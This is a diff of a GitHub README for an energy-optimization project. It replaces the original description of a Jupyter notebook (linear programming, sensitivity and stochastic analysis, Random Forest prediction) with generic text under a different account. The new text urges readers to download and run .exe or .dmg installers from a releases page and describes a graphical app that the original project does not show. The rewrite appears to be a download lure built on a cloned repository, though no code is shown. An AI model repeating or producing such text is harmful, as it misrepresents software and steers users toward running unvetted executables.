@@ -1,64 +1,101 @@
-# Energy Optimization with OR and ML ️‍🔥⚡ ![license](https://img.shields.io/github/license/Pegah-Ardehkhani/Energy-Optimization-OR-and-ML.svg) <a href="https://colab.research.google.com/github/Pegah-Ardehkhani/Energy-Optimization-OR-and-ML/blob/main/Energy%20Optimization%20with%20OR%20and%20ML.ipynb" target="_parent\"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a> [![nbviewer](https://img.shields.io/badge/render-nbviewer-orange.svg)](https://nbviewer.org/github/Pegah-Ardehkhani/Energy-Optimization-OR-and-ML/blob/main/Energy%20Optimization%20with%20OR%20and%20ML.ipynb)
+# ⚡ Energy-Optimization-OR-and-ML - Optimize Your Energy Consumption Easily
 
-This project explores the optimization of power generation from multiple sources, aiming to maximize profit while adhering to various operational constraints. It leverages both Operations Research (OR) techniques, specifically Linear Programming, and Machine Learning (ML) to address the complexities of energy management, including sensitivity analysis, parametric analysis, stochastic programming, and predictive modeling.
+[![Download Release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/releases)
 
-## Project Overview
+## 📖 Overview
 
-The core objective of this project is to determine the optimal electricity generation plan for a system comprising three power generators. The optimization considers factors such as profit per megawatt-hour (MWh), gas consumption per MWh, total available gas units, minimum electricity demand, and individual generator capacities. The project demonstrates how to derive an optimal generation strategy under deterministic conditions and then extends this analysis to incorporate uncertainty and predictive capabilities.
+Energy-Optimization-OR-and-ML is an application designed to help you solve energy optimization problems using a combination of Operations Research and Machine Learning. This software allows non-technical users to analyze energy systems for optimal performance without needing advanced technical knowledge.
 
-## Methodologies and Analyses
+With our user-friendly interface, you can conduct sensitivity and parametric analysis to better understand your energy usage. The application employs powerful optimization methods to assist you in making informed decisions regarding your energy consumption.
 
-#### 🔹 1. Linear Programming (LP) for Optimal Power Generation
+## 🚀 Getting Started
 
-What was done:
+To get started with Energy-Optimization-OR-and-ML, you will need a compatible computer with an internet connection. Below, you will find step-by-step instructions on how to download and run the software.
 
-The initial phase involved formulating the power generation problem as a Linear Program. This mathematical model was designed to maximize the total profit from the three generators subject to constraints on gas availability, minimum electricity demand, and the maximum capacity of each generator. The Gurobi optimizer was used to solve this LP model, identifying the precise MWh output for each generator that yields the highest profit.
+1. **System Requirements**:
+    - Operating System: Windows 10 or newer, macOS 10.13 or newer
+    - RAM: At least 4 GB
+    - Disk Space: Minimum of 100 MB free
+    - Internet Connection: Required for download and updates
 
-What was analyzed:
+2. **Download the Application**:
+    - Visit this page to download: [Download Energy-Optimization-OR-and-ML](https://github.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/releases)
 
-The analysis of the LP solution revealed the optimal power generation plan, specifying the exact output for each generator. It highlighted which generators were utilized to their full capacity, which were partially used, and which were not used at all, providing a clear, profit-maximizing strategy under the given deterministic conditions. Key insights were drawn regarding the efficiency and profitability of each generator.
+3. **Select the Latest Release**:
+    - On the releases page, look for the latest version of Energy-Optimization-OR-and-ML.
+    - Click on the link that says "Assets" to expand the list of download options.
 
-#### 🔹 2. Sensitivity Analysis
+4. **Choose Your File**:
+    - Download the appropriate file for your operating system.
+        - For Windows, look for a file that ends in .exe.
+        - For macOS, look for a file that ends in .dmg.
 
-What was done:
+5. **Install the Application**:
+    - Once the download is complete, locate the file in your downloads folder.
+    - For Windows: Double-click the .exe file and follow the installation prompts.
+    - For macOS: Open the .dmg file and drag the Energy-Optimization-OR-and-ML app to your Applications folder.
 
-Following the initial LP solution, a comprehensive sensitivity analysis was performed. This involved examining how changes in key parameters—such as generator profits and constraint right-hand sides (e.g., gas availability, minimum demand)—would impact the optimal solution and total profit. This analysis provided ranges within which these parameters could vary without altering the fundamental optimal generation strategy.
+6. **Run the Application**:
+    - After installation is complete, find the application in your programs list or applications folder.
+    - Double-click to open Energy-Optimization-OR-and-ML.
 
-What was analyzed:
+## 🛠️ Using Energy-Optimization-OR-and-ML
 
-Sensitivity analysis yielded critical insights into the robustness of the optimal solution. It identified binding and non-binding constraints, revealing which resources or demands were bottlenecks (e.g., gas availability) and which had slack (e.g., minimum demand). The analysis quantified the allowable increases and decreases in generator profits and constraint values, indicating the stability of the current optimal plan. Furthermore, shadow prices (dual values) were calculated to understand the marginal value of relaxing each constraint, providing economic insights into the scarcity and value of resources. Reduced costs were also analyzed to determine the profitability threshold for currently unused generators or those operating at their bounds.
+Once you launch the application, you will encounter a simple interface. Here's how to use it:
 
-#### 🔹 3. Parametric Analysis
+1. **Set Up Your Problem**:
+    - Begin by inputting the details of your energy system.
+    - Specify the variables you wish to optimize, such as energy sources and consumption rates.
 
-What was done:
+2. **Conduct Analysis**:
+    - Use the built-in tools for sensitivity and parametric analysis.
+    - These tools will show you how changes in one area affect the overall system.
 
-Parametric analysis was conducted to observe the dynamic changes in the optimal generation plan and total profit as a specific parameter was varied systematically. Specifically, the profit of Generator 3 was gradually increased to determine at what point it would become economically viable to include it in the optimal generation mix, and how its inclusion would affect the output of other generators and the overall profit.
+3. **Run Optimization**:
+    - Click on the "Run Optimization" button to start the analysis.
+    - The software will process the data and suggest the best energy consumption strategy.
 
-What was analyzed:
+4. **Review Results**:
+    - After completion, review the suggested optimization strategies.
+    - You can save your results or print them for further analysis.
 
-This analysis provided a visual and quantitative understanding of the trade-offs involved when a key economic factor changes. It showed how the optimal MWh output for each generator shifted in response to the varying profit of Generator 3, illustrating the breakpoints where the optimal strategy would change. The total profit curve demonstrated the non-linear impact of such changes, offering insights into the sensitivity of the overall system to individual generator profitability.
+## 🌐 Help and Support
 
-#### 🔹 4. Stochastic Programming
+If you encounter any issues, you can find help in the following ways:
 
-What was done:
+- **Documentation**: Refer to the user guide available within the application for detailed instructions.
+- **Community Forum**: Join our user community on GitHub. You can ask questions or share experiences.
+- **Contact Support**: If you need further assistance, reach out via the repository’s issue section on GitHub.
 
-To address real-world uncertainties, the project extended the optimization problem to include stochastic elements. This involved defining multiple scenarios for uncertain parameters, such as the profit of Generator 3 or gas availability, each with an associated probability. The objective was to maximize the expected total profit across these scenarios, leading to a more robust and resilient generation plan that accounts for variability.
+## 🎯 Key Features
 
-What was analyzed:
+- **User-Friendly Interface**: Designed for non-technical users.
+- **Sensitivity Analysis**: Understand how different variables affect your energy use.
+- **Parametric Analysis**: Explore different scenarios with ease.
+- **Machine Learning Optimization**: Leverage advanced techniques for better results.
 
-Stochastic programming revealed an optimal generation plan that performs well on average, rather than being tailored to a single deterministic outcome. The analysis demonstrated how the model balances potential profits and risks across different scenarios, leading to a decision that is robust against future uncertainties. It highlighted the expected total profit and the profit contribution from each scenario, providing a comprehensive view of the system's performance under probabilistic conditions. This approach underscored the value of proactive planning in volatile environments.
+## 📝 Topics Covered
 
-#### 🔹 5. Machine Learning for Predictive Modeling and Pattern Discovery
+Our application encompasses various topics, including:
 
-What was done:
+- Energy Systems
+- Linear Programming
+- Operations Research
+- Machine Learning Techniques
+- Sensitivity and Parametric Analysis
 
-Leveraging the power of Machine Learning, a dataset was generated by solving numerous LP instances under varying input conditions (gas availability, demand, and generator profits). This dataset was then used to train a Random Forest Regressor model. The ML model was tasked with predicting the optimal generator outputs and total profit for new, unseen scenarios. Additionally, clustering techniques (K-Means) were applied to the generated LP solutions to identify distinct operational patterns or regimes.
+## 🔗 Links
 
-What was analyzed:
+For further details and updates, you can visit our GitHub repository:
 
-The trained Random Forest model demonstrated its ability to accurately predict optimal generation plans and profits, providing a fast and efficient alternative to solving complex LPs for every new scenario. The analysis included evaluating the model's performance using metrics like Mean Squared Error and identifying feature importances, which revealed which input parameters had the most significant impact on the optimal outputs. This provided valuable insights into the drivers of the optimal solution. Furthermore, the clustering analysis uncovered natural groupings within the optimal solutions, indicating different operational strategies that emerge under varying conditions. This pattern discovery can help in developing simplified decision-making rules or understanding the underlying structure of the optimal solution space.
+- [GitHub Repository](https://github.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML)
 
-## Conclusion
+Don’t forget to check the releases page for the latest updates and features:
 
-This project successfully integrates Operations Research and Machine Learning to provide a holistic framework for energy optimization. By combining the precision of linear programming with the predictive power of machine learning and the robustness of stochastic analysis, it offers a comprehensive approach to managing power generation in dynamic and uncertain environments. The analyses performed provide deep insights into optimal resource allocation, sensitivity to changing conditions, and the identification of key operational patterns, enabling more informed and resilient decision-making in the energy sector.
+- [Latest Releases](https://github.com/MuhammadTalhaPawa/Energy-Optimization-OR-and-ML/releases)
 
+## 📢 Acknowledgments
+
+Thanks to contributors and the community for making Energy-Optimization-OR-and-ML possible. Your support and feedback help us improve the software.
+
+Happy optimizing!
